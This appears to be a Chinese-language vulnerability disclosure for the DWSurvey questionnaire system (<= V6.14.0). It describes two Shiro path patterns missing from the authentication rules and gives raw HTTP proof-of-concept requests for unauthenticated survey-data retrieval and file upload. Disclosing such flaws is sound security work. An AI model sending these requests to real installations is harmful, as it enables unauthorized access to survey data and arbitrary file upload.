# DWSurvey 未授权访问漏洞报告

## 漏洞描述

DWSurvey（调问网）是一款开源问卷系统。其Shiro过滤链配置在`ShiroConfig.java`中定义了`/api/dwsurvey/anon/**`、`/api/dwsurvey/app/**`和`/api/dwsurvey/admin/**`路径的认证规则。但`/api/dwsurvey/none/**`和`/api/dwsurvey/up/**`路径模式未包含在任何Shiro过滤规则中，导致完全未受保护。攻击者无需认证即可访问问卷数据和上传文件。

---

## 影响版本

DWSurvey（dwsurvey-oss-vue）<= V6.14.0

---

## 利用条件

- 目标可访问 `/api/dwsurvey/none/**` 或 `/api/dwsurvey/up/**`
- 默认无需登录

---

## 漏洞复现

### 漏洞一：/api/dwsurvey/none/** 认证绕过未授权获取业务数据

**文件路径**：`src/main/java/net/diaowen/dwsurvey/config/ShiroConfig.java`
**行号**：194-207

**暴露的Controller**：`DwAnswerSurveyController.java` 第51行

```java
@RequestMapping("/api/dwsurvey/none/v6/dw-answer-survey")
```

**暴露的接口**：

- `GET /api/dwsurvey/none/v6/dw-answer-survey/survey-json-by-survey-id.do` - 获取问卷数据

**请求包**：

```
GET /api/dwsurvey/none/v6/dw-answer-survey/survey-json-by-survey-id.do HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Connection: keep-alive
```

---

![image-20260803214433922](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260803214433922.png)

### 漏洞二：/api/dwsurvey/up/** 认证绕过导致未授权文件上传

**暴露的Controller**：`UploadController.java` 第34行

```java
@RequestMapping("/api/dwsurvey/up")
```

**请求包**：

```
POST /api/dwsurvey/up/up-file.do HTTP/1.1
Host: localhost:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Connection: keep-alive
Content-Length: 134

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="test2026.txt"

<img >
------WebKitFormBoundary--

```

![image-20260803214243516](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260803214243516.png)
